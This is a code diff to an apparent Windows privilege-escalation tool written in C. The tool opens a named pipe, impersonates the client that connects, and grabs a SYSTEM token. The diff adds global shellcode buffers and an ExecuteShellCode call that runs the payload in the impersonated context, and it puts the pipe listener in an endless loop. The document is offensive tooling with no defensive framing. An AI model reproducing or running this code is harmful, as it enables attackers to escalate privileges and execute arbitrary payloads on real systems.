@@ -3,6 +3,8 @@
 
 extern LPWSTR g_pwszCommandLine;
 extern HANDLE hSystemToken;
+extern PCHAR g_ShellcodeBuffer;
+extern DWORD g_dwShellcodeSize;
 
 
 void GetSystemAsImpersonatedUser(HANDLE hToken)
@@ -15,7 +17,7 @@ void GetSystemAsImpersonatedUser(HANDLE hToken)
 	LPVOID lpEnvironment = NULL;
 	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
 	
-	// WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
+	
 	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
 	
 
@@ -91,22 +93,26 @@ void StartNamedPipeAndGetSystem()
 	{
 		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
 		
-		if (ConnectNamedPipe(hPipe, NULL) > 0) {
-			wprintf(L"[+] A client connected!\n");
-			if (ImpersonateNamedPipeClient(hPipe)) {
-				WCHAR szUser[256];
-				DWORD dwSize = 265;
-				GetUserName(szUser, &dwSize);
-				wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
-
-				if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
-					CloseHandle(hPipe);
+		for (;;) {
+			if (ConnectNamedPipe(hPipe, NULL) > 0) {
+				wprintf(L"[+] A client connected!\n");
+				if (ImpersonateNamedPipeClient(hPipe)) {
+					WCHAR szUser[256];
+					DWORD dwSize = 265;
+					GetUserName(szUser, &dwSize);
+					wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
+					if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
+						ExecuteShellCode(g_ShellcodeBuffer, g_dwShellcodeSize);
+					}
+					if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
+						CloseHandle(hPipe);
+					}
 				}
-			}
-			else {
-				wprintf(L"[-] CreateNamedPipe error\n");
-				CloseHandle(hPipe);
-				return;
+				else {
+					wprintf(L"[-] CreateNamedPipe error\n");
+					CloseHandle(hPipe);
+					return;
+				}
 			}
 		}
 		return;
